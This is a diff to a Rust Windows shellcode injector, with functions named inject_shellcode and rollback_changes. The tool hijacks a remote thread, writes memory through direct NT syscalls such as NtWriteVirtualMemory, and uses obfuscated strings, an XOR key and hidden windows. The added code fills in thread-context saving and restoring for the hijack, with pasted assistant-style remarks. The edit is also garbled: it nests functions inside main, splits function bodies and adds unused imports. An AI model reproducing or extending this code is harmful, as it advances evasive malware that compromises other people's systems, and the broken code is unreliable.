@@ -14,6 +14,14 @@ use std::{mem::size_of, ptr::null_mut};
 use widestring::U16CString;
 use winapi::ctypes::c_void;
 use std::sync::atomic::{AtomicBool, Ordering};
+use std::result::Result;
+use std::option::Option;
+use log::LogLevel;
+use std::fmt;
+use std::collections::{HashMap, HashSet};
+use std::sync::{Mutex, RwLock};
+use std::fs;
+use std::io::Error;
 
 use windows_sys::Win32::{
     System::{
@@ -127,12 +135,6 @@ const MAC: &[&str] = &[
 ];
 
 
-
-
-
-
-
-
 const KEY: u8 = 0x42;
 const STARTF_USESHOWWINDOW: DWORD = 0x00000001;
 const SW_HIDE: c_int = 0;
@@ -185,12 +187,42 @@ struct Process {
 
 }
 
-// Placeholder for logging errors
+fn main() -> Result<(), &'static str> {
+    // Placeholder for logging errors
 fn log_error(message: &str, error: &str) {
     println!("{}: {}", message, error);
 }
+     // Rollback logic to revert changes in case of failure
+fn rollback_changes(original_memory: &[u8], context: &CONTEXT, h_thread: HANDLE, h_process: HANDLE) {
 
-fn main() -> Result<(), &'static str> {
+// Placeholder for saving and restoring thread context
+fn save_and_restore_thread_context(hThread: HANDLE) -> Result<(), &'static str> {
+    // Initialize a CONTEXT structure to zero
+    let mut context: CONTEXT = unsafe { std::mem::zeroed() };
+    context.ContextFlags = CONTEXT_ALL;
+
+    // Save the thread's context
+    let status_get_context = unsafe { syscall!("NtGetContextThread", hThread, &mut context as *mut _) };
+    if !NT_SUCCESS(status_get_context) {
+        return Err("[!] NtGetContextThread failed");
+    }
+
+    // At this point, the 'context' variable contains the saved context.
+    // You can modify the context here if needed.
+    //This function uses the NtGetContextThread and NtSetContextThread syscalls to get and set the thread context.
+    //The CONTEXT structure is populated by NtGetContextThread and then used in NtSetContextThread to restore the thread's state.
+    //Please note that the above code is a simplified example and assumes that you have already defined or imported the CONTEXT structure and NT_SUCCESS macro,
+    //and that you have a way to make syscalls (syscall! macro in this example).
+
+    // Restore the thread's context
+    let status_set_context = unsafe { syscall!("NtSetContextThread", hThread, &context as *const _) };
+    if !NT_SUCCESS(status_set_context) {
+        return Err("[!] NtSetContextThread failed");
+    }
+
+    Ok(())
+}
+
     // Get the remote thread handle
     let hThread = match get_remote_thread_handle(process.process_id) {
         Ok(handle) => handle,
@@ -478,8 +510,6 @@ fn inject_shellcode(process: &mut Process) -> Result<(), String> {
         Err(e) => panic!("{} {}", lc!("Failed to get remote thread handle:"), e), // Changed to panic
     };
     
-// Rollback logic to revert changes in case of failure
-fn rollback_changes(original_memory: &[u8], context: &CONTEXT, h_thread: HANDLE, h_process: HANDLE) {
     // Restore the original memory
     unsafe {
         syscall!("NtWriteVirtualMemory", h_process, context.Rip as *mut u8, original_memory.as_ptr() as *const _, original_memory.len() as SIZE_T, std::ptr::null_mut::<c_void>());
@@ -494,13 +524,6 @@ fn rollback_changes(original_memory: &[u8], context: &CONTEXT, h_thread: HANDLE,
     }
 }
 
-// Placeholder for saving and restoring thread context
-fn save_and_restore_thread_context(hThread: HANDLE) -> Result<(), &'static str> {
-    // Implement logic to save and restore the thread's context
-    // This could involve using GetThreadContext and SetThreadContext WinAPI functions
-    Ok(())
-}
-    
     // Hijack the thread
     let formatted_string = format!("{} {:p}", lc!("[+] Remote Thread Handle Obtained:"), hThread);
     println!("{}",formatted_string);
